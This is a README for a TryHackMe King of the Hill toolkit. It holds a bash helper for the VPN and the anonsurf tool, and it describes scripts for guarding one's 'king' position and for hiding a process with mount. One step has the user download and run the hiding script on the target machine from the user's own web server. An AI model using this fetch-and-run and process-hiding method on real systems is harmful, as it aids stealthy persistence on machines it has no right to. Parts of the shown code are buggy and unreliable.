>בס״ד
<div align="center">

![image](https://user-images.githubusercontent.com/51442719/172729066-1293d382-4a31-4f03-8c23-ab0ea5f611a0.png)

# [`Anlominus`](https://github.com/Anlominus) 🤴 [King of the Hill](https://tryhackme.com/games/koth) `BETA`

---


</div>

---

# 📜 KoTH Menu ~ To Do
- 📜 Menu
### 1️⃣ ~ [`KoTH`](./KoTH) ~> TryHackMe VPN
> Simple helper script for VPN, VM's, etc
```shell
wget https://raw.githubusercontent.com/Anlominus/TryHackMe/main/King%20of%20the%20Hill/KoTH/KoTH ; chmod +x KoTH
```

---

### 2️⃣ ~ [`KoTH-Protection`](./KoTH-Protection) ~> Protecting Rank in King of The Hill
> A script to protect your king
```shell
wget https://github.com/Anlominus/TryHackMe/blob/main/King%20of%20the%20Hill/KoTH/KoTH-Protection ; chmod +x KoTH-Protection
```

---

### 3️⃣ ~ [`KoTh-Hidding`](./KoTh-Hidding) ~> A simple script to hide a process with mount
```shell
wget https://github.com/Anlominus/TryHackMe/blob/main/King%20of%20the%20Hill/KoTH/KoTh-Hidding; && chmod +x KoTh-Hidding
```
> - Start local server <br>
>   - `python3 -m http.server 80` <br>
> - in the Target Machine <br>
>   - `wget http://yourvpnip/KoTh-Hidding && chmod +x KoTh-Hidding && ./KoTh-Hidding`


---

```shell
#!/bin/sh
#!/bin/bash
#!/usr/bin/bash
#!/usr/bin/env bash
#!/data/data/com.termux/files/usr/bin/bash
###############################################
# Name : Anlominus ~ KoTH
# Last UPDATE : 2022 Jun 13
# Create Date : 2022 Jun 10
# Description: TryHackMe - Simple helper script for VPN, VM's, etc
# Skils: Best Copywriter IN the COSMOS!
# BIG THANX TO ALL COMUNITY THAT SHARE ALL THAT FREE GREAT SCRIPTS
# CREDIT: To All World Creators free Scripts & Tools
# Location: Made With LOVE IN ISRAEL !
# Source: [ https://github.com/Anlominus/TryHackMe/tree/main/King%20of%20the%20Hill/KoTH ]
# Aouther: f11snipe +~> Anlominus ~> RhytMix ~> KoTH
# TryHackMe ~> King of The Hill: https://tryhackme.com/games/koth
###############################################
clear

DiabloColors(){
##############################################################################
# COLORS AND BACKGROUNDS
##############################################################################
Color_Off='\033[0m' # Text Reset

# Regular Colors
Black='\033[0;30m'  # Black
Red='\033[0;31m'    # Red
Green='\033[0;32m'  # Green
Yellow='\033[0;33m' # Yellow
Blue='\033[0;34m'   # Blue
Purple='\033[0;35m' # Purple
Cyan='\033[0;36m'   # Cyan
White='\033[0;97m'  # White

# Additional colors
LGrey='\033[0;37m'   # Ligth Gray
DGrey='\033[0;90m'   # Dark Gray
LRed='\033[0;91m'    # Ligth Red
LGreen='\033[0;92m'  # Ligth Green
LYellow='\033[0;93m' # Ligth Yellow
LBlue='\033[0;94m'   # Ligth Blue
LPurple='\033[0;95m' # Light Purple
LCyan='\033[0;96m'   # Ligth Cyan


# Bold
BBlack='\033[1;30m'  # Black
BRed='\033[1;31m'    # Red
BGreen='\033[1;32m'  # Green
BYellow='\033[1;33m' # Yellow
BBlue='\033[1;34m'   # Blue
BPurple='\033[1;35m' # Purple
BCyan='\033[1;36m'   # Cyan
BWhite='\033[1;37m'  # White

# Underline
UBlack='\033[4;30m'  # Black
URed='\033[4;31m'    # Red
UGreen='\033[4;32m'  # Green
UYellow='\033[4;33m' # Yellow
UBlue='\033[4;34m'   # Blue
UPurple='\033[4;35m' # Purple
UCyan='\033[4;36m'   # Cyan
UWhite='\033[4;37m'  # White

# Background
On_Black='\033[40m'  # Black
On_Red='\033[41m'    # Red
On_Green='\033[42m'  # Green
On_Yellow='\033[43m' # Yellow
On_Blue='\033[44m'   # Blue
On_Purple='\033[45m' # Purple
On_Cyan='\033[46m'   # Cyan
On_White='\033[47m'  # White
}
DiabloColors

# COLORS! :)
red='\033[0;31m'
cyan='\033[0;36m'
blue='\033[0;34m'
yellow='\033[0;33m'
nocolor='\033[0m'
koth_banner(){
  #statements
  echo "
$LYellow \t\t █████   ████${BYellow}          ███████████${DGrey} █████   █████
$LYellow \t\t░░███   ███░ ${BYellow}         ░█░░░███░░░█${DGrey}░░███   ░░███
$LYellow \t\t ░███  ███   ${BYellow}  ██████ ░   ░███  ░ ${DGrey} ░███    ░███
$LYellow \t\t ░███████    ${BYellow} ███░░███    ░███    ${DGrey} ░███████████
$LYellow \t\t ░███░░███   ${BYellow}░███ ░███    ░███    ${DGrey} ░███░░░░░███
$LYellow \t\t ░███ ░░███  ${BYellow}░███ ░███    ░███    ${DGrey} ░███    ░███
$LYellow \t\t █████ ░░████${BYellow}░░██████     █████   ${DGrey} █████   █████
$LYellow \t\t░░░░░   ░░░░ ${BYellow} ░░░░░░     ░░░░░    ${DGrey}░░░░░   ░░░░░
                                                      "
}
koth_banner

anonSurfing(){
  #statements
  echo "\n\t\t $blue Anonimity Status ~>: $yellow \n"
  anonsurf status
  sleep 3
  echo "\n\t\t $blue Anonimity Stoping ~>: $yellow \n"
  anonsurf stop
  echo "\n\t\t $blue Anonimity Status ~>: $yellow \n"
  anonsurf status
  sleep 3
  echo "\n\t\t $blue Anonimity Starting ~>: $yellow \n"
  anonsurf start
  echo "\n\t\t $blue Anonimity Status ~>: $yellow \n"
  anonsurf status
  sleep 3

}

# Define variable for THM username
read_username=$(echo "\n\t\t $yellow Enter Your User Name:$red ")
read -p "$read_username" Alm
if [ -z $Alm ]; then
  #statements
  Alm="Anlominus"
fi
username="$Alm"

# Define directory were $username.ovpn is located
vpn_dir="$HOME/.vpn"
if [ -d /$HOME/.vpn ]; then
  #statements
  echo "\n\t\t $red VPN Location exists ~>: $yellow  $vpn_dir  \n"
  ls -lahs $vpn_dir
else
  echo "\n\t\t $yellow Creating .vpn Folder In $HOME/ Directory\n"
  mkdir $HOME/.vpn
fi

# Define variable for our search string (find this running process)
vpn_file="$vpn_dir/$username.ovpn"
if [ -e $vpn_file ]; then
  #statements
  echo "\n\t\t $red Found TryHackme VPN File ~>: $yellow  $vpn_file  \n"
else
  cant_found=$(echo "\n\t\t $red Can't Found TryHackme VPN File !! \n\n\t\t  Enter $username.ovpn Location ~>: ")
  read -p "$cant_found"  this_location
  echo "\n\t\t $red Found TryHackme VPN File ~>: $yellow  $this_location\n\t\t $red Moving To $vpn_dir/"
  mv $this_location $vpn_file
fi
# Regex pattern to validate IP format (#.#.#.#)
valid_ip="([0-9]{1,3}\.){3}"
valid_thm=".*\.thm$"

# Session logfile
session_log=$vpn_dir/KoTH-$(date).log
echo "\n\t\t $red Session logfile ~>: $yellow $session_log\n"

# Location of profile to update (.zshrc, .bashrc, .bash_profile, etc)
profile_file=~/.zshrc

# Save the incoming args to vars with better names (./thm-vm $1 $2 $3)
arg1=$1
arg2=$2
arg3=$3

# Error helper function, prefix with red color and exit 1 (non zero is error)
# https://emojipedia.org/search/?q=warning
# 🚫 🚭 🚨
error() {
  echo "      ${red}  |"
  echo "      ${cyan}  |---------------------------------"
  prefix="\n\t\t [ERROR] \n\n\t\t"
  echo "${red}${prefix}${1}${nocolor}\n"
  echo "      ${cyan}  |---------------------------------"
  echo "      ${red}  |"
  exit ${2:-1}
}

# Warning helper function, show warning prefix with yellow color
warn() {
  echo "      ${red}  |"
  echo "      ${cyan}  |---------------------------------"
  prefix="\n\t\t [WARN] \n\n\t\t"
  echo "${yellow}${prefix}${1}${nocolor}\n"
  echo "      ${cyan}  |---------------------------------"
  echo "      ${red}  |"
}

# log log with cyan color & prefix
log() {
  echo "      ${red}  |"
  echo "      ${cyan}  |---------------------------------"
  prefix="\n\t\t [INFO] \n\n\t\t"
  echo "${cyan}${prefix}${1}${nocolor}\n"
  echo "      ${cyan}  |---------------------------------"
  echo "      ${red}  |"
}

# Function to read user input, and return boolean whether they confirm "[Y/n]"
# NOTE: Capital "Y" typically denotes default, so no resp (just enter key) will be "yes" (true)
confirmYes() {
  echo ""
  msg="${1:-Are you sure?}"
  read -r -p "${msg} [Y/n] " response
  case "$response" in
    [nN][oO]|[nN])
      return 1
      ;;
    *)
      return 0
      ;;
  esac
}

connectVpn() {
  if [ "$vpn_running" != "0" ]; then
    warn "🤨 THM VPN is not running!"
    warn "Searching for process: '$vpn_file' (using ps aux | grep ...)"

    if confirmYes "Connect to VPN now? (requires sudo)"; then
      sudo echo "init" > $session_log
      sudo -b openvpn $vpn_file > $session_log 2>&1 &

      log "Done! 😁"
    fi
  else
    log "THM VPN Connection Confirmed 👍"
    echo "\n\n\t\t $cyan $(ifconfig tun0) \n"
  fi
}

# Check if openvpn connection is running
ps aux | grep "$vpn_file"
vpn_running=$?

if [ "$arg1" == "kill" ]; then
  if [ "$vpn_running" == "0" ]; then
    log "Found running openvpn process(es):"
    ps aux | grep "$vpn_file" | grep -v grep

    if confirmYes "Kill all process(es)?"; then
      sudo pkill -f "$vpn_file"
      sudo pkill grep

      if [ "$?" == "0" ]; then
        log "They're ... all ... dead 🤥"
        exit 0
      else
        error "EPIC FAIL"
      fi
    else
      warn "Aborting 'kill' command"
    fi
  fi
elif [ "$arg1" == "log" ]; then
  cat $session_log
  log "This sesion log file is located: $session_log"
elif [ $arg1 -e $valid_ip ]; then
  connectVpn
  if confirmYes "Update profile with VMIP=$arg1  "; then
    res=$(cat $profile_file | sed -e "s/VMIP=\(.*\)\( \#.*\)/VMIP=$arg1/g" | grep VMIP)
    log "Editing $profile_file: $res"
    sed -i'.bak' -e "s/VMIP=\(.*\)/VMIP=$arg1/g" $profile_file
    log "Run: 'source $profile_file' (to reload this session, new terminals will have \$VMIP set automatically)"
  else
    warn "Aborting new vm session"
  fi

  if [ $arg2 =~ $valid_thm ]; then
    warn "ADD AS HOST [/etc/hosts]: $arg1    $arg2"
  fi
else
  connectVpn
fi

create_Desktop_App() {
  a1=$(wget https://raw.githubusercontent.com/Anlominus/TryHackMe/main/King%20of%20the%20Hill/KoTH/KoTH.png)
  b2=$(cp KoTH /usr/share/KoTH/; mv KoTH.png /usr/bin/KoTH/)
  c3=$(
  cat << EOF > KoTH.desktop
  [Desktop Entry]
  Name=KoTH
  Type=Application
  Path=/usr/bin/KoTH
  Exec=/usr/bin/KoTH/KoTH start
  Icon=KoTH.png
  Terminal=true
  Categories=Anlominus
  StartupNotify=false
  EOF
  )
  cp KoTH.desktop ~/Desktop/
  a1 
  b2 
  c3
  }
```

---

# TryHackMe Menu ToDo

---

- [x] Scope
  - [ ] 1️⃣ Asking For Username:
  - [ ] 2️⃣ Asking For TryHackMe VPN File Location:
  - [ ] 3️⃣ Asking Data for Reporting:
  - [ ] 4️⃣ Asking Location For Reporting:
  - [ ] 5️⃣ Asking For IP Target: +~> Insert it to ${box_ip}
  - [ ] 6️⃣ Asking For Name Target: +~> Insert it to ${box_name}

---

- [x] Start
  - [ ] 1️⃣ Adding ${box_ip} ${box_name} ~>> /etc/hosts
    - `sudo echo "${box_ip}   ${box_name}" >> /etc/hosts`  
  - [ ] 2️⃣ Asking For TryHackMe VPN File Location:
  - [ ] 3️⃣ Asking Data for Reporting:

---

- [x] Stop
    - [ ] anonsurf status
    - [ ] anonsurf start
    - [ ] anonsurf stop

---

- [x] Status
    - [ ] Asking For Username:

---
